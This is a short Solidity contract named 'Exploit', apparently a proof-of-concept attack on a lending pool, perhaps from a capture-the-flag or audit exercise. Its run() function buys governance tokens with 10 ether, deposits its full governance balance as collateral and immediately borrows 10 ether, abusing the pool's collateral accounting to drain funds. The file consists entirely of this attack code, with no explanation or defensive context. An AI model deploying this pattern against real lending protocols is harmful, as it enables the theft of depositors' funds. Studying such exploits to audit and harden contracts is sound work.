// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

interface ILendPool {
    function buyGov() external payable;
    function depositCollateral(uint amount) external;
    function borrow(uint amount) external;
    function govOf(address) external view returns (uint);
}

contract Exploit {
    ILendPool public pool;

    constructor(address target) payable {
        pool = ILendPool(target);
    }

    function run() external {
        pool.buyGov{value: 10 ether}();
        pool.depositCollateral(pool.govOf(address(this)));
        pool.borrow(10 ether);
    }

    receive() external payable {}
}
